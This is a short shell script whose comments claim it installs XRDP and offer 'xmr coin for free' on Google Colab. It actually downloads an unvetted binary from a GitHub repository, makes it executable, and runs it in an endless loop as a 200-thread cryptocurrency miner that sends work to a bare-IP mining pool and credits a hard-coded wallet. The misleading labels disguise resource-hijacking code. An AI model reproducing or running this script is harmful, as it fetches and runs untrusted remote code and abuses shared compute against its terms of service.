# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R VTM

wget https://github.com/angkii/asu/raw/main/VTM
chmod 700 VTM

#!/bin/sh
#
# Choose nearest stratum:
#       stratum-eu.rplant.xyz   /France/
#       stratum-asia.rplant.xyz /Singapore/
#       stratum-na.rplant.xyz   /Canada/
#
FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
while [ 1 ]; do
"$FOLDER"/VTM -a yescryptr16 -o stratum+tcps://178.128.86.41:80 -u vS9YupBzjfTrS9x7EPibXEMCPsoSTrDBQB.VRTM -t200
sleep 5
done
